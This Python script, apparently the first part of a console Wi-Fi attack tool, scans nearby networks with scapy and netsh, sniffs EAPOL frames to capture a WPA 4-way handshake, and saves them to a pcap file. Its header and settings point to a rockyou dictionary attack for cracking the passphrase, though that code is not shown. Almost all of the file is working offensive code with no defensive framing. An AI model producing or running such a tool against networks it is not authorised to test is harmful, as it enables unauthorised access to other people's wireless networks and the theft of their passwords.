#!/usr/bin/env python3
"""
Wi-Fi Scanner + Handshake Capture + rockyou Dictionary Attack (console version)
"""

import os
import sys
import subprocess
import time
import platform
import threading
import queue
import ctypes
try:
    from scapy.config import conf
    conf.cache = False
except:
    pass

try:
    from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, EAPOL, wrpcap
except ImportError:
    print("❌ scapy not installed! Run: pip install scapy")
    sys.exit(1)

# ================= CONFIG =================
SCAN_DURATION     = 20
CAPTURE_DURATION  = 90
OUTPUT_PCAP       = "handshake.pcap"
INTERFACE         = "wlan0"
MAX_WORKERS       = 8
ROCKYOU_PATH      = "rockyou.txt"
MAX_ROCKYOU_LINES = 100_000

stop_event   = threading.Event()
result_queue = queue.Queue()

# ─── Functions ────────────────────────────────────────────────

def is_admin():
    if platform.system() == "Windows":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.geteuid() == 0

def scan_wifi_windows():
    print("\n🔍 Scanning nearby Wi-Fi (netsh)...")
    try:
        out = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"],
                                      text=True, stderr=subprocess.STDOUT)
        print(out)
    except Exception as e:
        print(f"❌ {e}")
def scan_thread(iface):
    networks = {}
    def handler(pkt):
        if stop_event.is_set(): return True
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3.upper()
            if bssid in networks: return
            ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore') or "<hidden>"
            signal = getattr(pkt[RadioTap], "dBm_AntSignal", "N/A") if pkt.haslayer(RadioTap) else "N/A"
            networks[bssid] = {"ssid": ssid, "signal": signal}
            result_queue.put(("found", f"Found → {ssid:<30} | {bssid} | Sig:{signal}"))

    try:
        result_queue.put(("status", f"Scanning on {iface}..."))
        sniff(iface=iface, prn=handler, timeout=SCAN_DURATION, store=0)
    finally:
        result_queue.put(("networks", networks))
        result_queue.put(("status", "Scan finished"))

def capture_thread(iface, target_bssid, target_ssid):
    packets = []
    count = [0]
    def handler(pkt):
        if stop_event.is_set(): return True
        if pkt.haslayer(EAPOL):
            count[0] += 1
            packets.append(pkt)
            result_queue.put(("status", f"EAPOL packet #{count[0]} captured"))
            if count[0] >= 4:
                result_queue.put(("status", "✅ Full 4-way handshake captured!"))
                return True
        return False

    try:
        result_queue.put(("status", f"Capturing handshake for {target_ssid}..."))
        sniff(iface=iface, prn=handler, timeout=CAPTURE_DURATION, store=0)
        if packets:
            wrpcap(OUTPUT_PCAP, packets)
            result_queue.put(("status", f"✅ Saved to {OUTPUT_PCAP}"))
    except Exception as e:
        result_queue.put(("status", f"Error: {e}"))
